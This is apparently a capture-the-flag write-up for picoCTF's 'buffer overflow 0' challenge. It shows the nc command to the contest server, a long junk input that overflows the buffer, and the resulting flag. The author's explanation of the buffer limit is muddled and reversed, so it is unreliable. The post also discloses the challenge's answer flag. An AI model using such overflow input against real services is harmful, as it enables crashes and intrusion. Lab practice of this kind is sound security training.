# buffer overflow 0

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).Connect using:`nc saturn.picoctf.net 55418`

## Solution

In this challenge I read the source code and understood that the given code can only handle the input which is larger than 64 so I decided to just causes a buffer overflow error and did the following thing

```bash
nc saturn.picoctf.net 55418
Input: what are we doing irhgt now isncce iaophjsdfujasdcvasdjfasdf,.jxc jdcvxljsd flk;jasdf sadopfrujasdf
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

The output of the following was directly just the flag.
